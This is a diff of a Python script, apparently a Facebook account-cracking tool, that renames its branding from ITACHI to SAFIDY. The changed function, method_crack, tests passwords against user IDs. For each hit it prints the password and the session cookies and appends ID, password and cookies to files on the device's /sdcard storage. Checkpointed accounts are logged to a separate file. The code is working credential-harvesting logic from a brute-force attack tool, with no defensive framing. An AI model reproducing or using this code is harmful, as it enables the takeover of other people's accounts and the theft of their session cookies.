@@ -147,21 +147,21 @@ def method_crack(ids, passlist):
                 if str(uid) in oks:
                     break
                 else:
-                    print('\r\r \033[1;32m[ITACHI-OK] '+str(uid)+' | '+pas+'\033[1;37m')
+                    print('\r\r \033[1;32m[SAFIDY-OK] '+str(uid)+' | '+pas+'\033[1;37m')
                     coki=";".join(i["name"]+"="+i["value"] for i in reqx["session_cookies"])
                     print('\033[1;32m [COOKIES] '+coki)
                     # Vérifier si le dossier ITACHI-IDS existe et le créer si nécessaire
-                    if not os.path.exists("/sdcard/ITACHI-IDS"):
-                        os.makedirs("/sdcard/ITACHI-IDS")
-                    # Enregistrer dans le fichier ITACHI-OK.txt
-                    with open(os.path.join("/sdcard/ITACHI-IDS", "ITACHI-OK.txt"), 'a') as f:
+                    if not os.path.exists("/sdcard/SAFIDY-IDS"):
+                        os.makedirs("/sdcard/SAFIDY-IDS")
+                    # Enregistrer dans le fichier SAFIDY-OK.txt
+                    with open(os.path.join("/sdcard/SAFIDY-IDS", "SAFIDY-OK.txt"), 'a') as f:
                         f.write(str(uid)+'|'+pas+'|'+coki+'\n')
                     oks.append(str(uid))
                     break
             elif 'www.facebook.com' in reqx['error_msg']:
-                print('\r\r \033[1;30m[ITACHI-CP] '+ids+' | '+pas+'\033[1;37m')
-                # Enregistrer dans le fichier ITACHI-CP.txt
-                with open(os.path.join("/sdcard/ITACHI-IDS", "ITACHI-CP.txt"), 'a') as f:
+                print('\r\r \033[1;30m[SAFIDY-CP] '+ids+' | '+pas+'\033[1;37m')
+                # Enregistrer dans le fichier SAFIDY-CP.txt
+                with open(os.path.join("/sdcard/SAFIDY-IDS", "SAFIDY-CP.txt"), 'a') as f:
                     f.write(ids+'|'+pas+'\n')
                 cps.append(ids)
                 break
